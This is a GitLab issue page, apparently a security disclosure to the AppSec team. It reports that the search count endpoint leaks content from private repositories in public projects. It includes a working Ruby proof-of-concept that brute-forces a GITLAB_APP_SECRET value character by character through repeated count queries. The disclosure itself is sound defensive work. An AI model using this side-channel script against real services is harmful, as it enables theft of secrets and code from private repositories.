=== Content from gitlab.com_995b2175_20250111_021011.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Search count can leak content of private repositories in public projects

### Summary

Using `https://gitlab.com/search/count` it is possible to leak information from private repositories in public projects.

### Steps to reproduce

The following script illustrates the issue by leaking character by character the [`GITLAB_APP_SECRET`](https://gitlab.com/gitlab-org/customers-gitlab-com/-/blob/main/.env.example#L6) test value from the `customers-gitlab-com` repo which is not public (but the project is). (Note the value isn't secret, it's being defined [here](https://gitlab.com/gitlab-org/gitlab/blob/9f04c2234bf6ba4f4a7619d1718afab5a26accfe/db/fixtures/development/28_integrations.rb#L17-L17))

```
#!/usr/bin/ruby
require 'httparty'
require 'json'

COUNT ='
    .wwwwwwww.
  .w"  "WW"  "w.
 ."   /\  /\   ".
|\     o  o     /|
 \|  ___\/___  |/
 / \ \_v__v_/ / \
/ | \________/ | \
>  \   WWWW   /  <
\   \   ""   /   /
 \   \      /   /
'

repo_id = '2670515' # gitlab-org/customers-gitlab-com
group_id = '9970'   # gitlab-org
partial_string = "GITLAB_APP_SECRET="
puts COUNT
puts
puts "~> Starting the count attack!"
puts

@chars = %W[a b c d e f 0 1 2 3 4 5 6 7 8 9] # adjust as needed
@results = {}
def find_next(url, str)
  iterations = 0
  @chars.each do |c|
    response = HTTParty.get(url+str+c+"%22")
    count = JSON.parse(response.body)
    if count["count"] != "0"

      follow = str + c

      puts "~> Count found: #{follow}"
      find_next(url,follow)
    end
    iterations += 1
  end
end

find_next("https://gitlab.com/search/count?group_id=#{group_id}&scope=blobs&search=r%3A#{repo_id}%20%22#{CGI.escape(partial_string)}","")
```

In the demo script we're limiting the search results with `r:2670515` in the query to the `customers-gitlab-com` repo, `2670515` is that repo's project id.

### What is the current *bug* behavior?

Search hit count leaks for private repos in public projects.

### What is the expected *correct* behavior?

The search hit count should not include private repositories.

### Relevant logs and/or screenshots

[![image](data:image/gif;base64...)](/-/project/278964/uploads/ee6977bdcdd59f6aa97cad0949478eb3/image.png)

### Output of checks

This bug happens on GitLab.com

---

cc [@gitlab-com/gl-security/appsec](/gitlab-com/gl-security/appsec "GitLab.com / GitLab Security Department / Application Security")

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


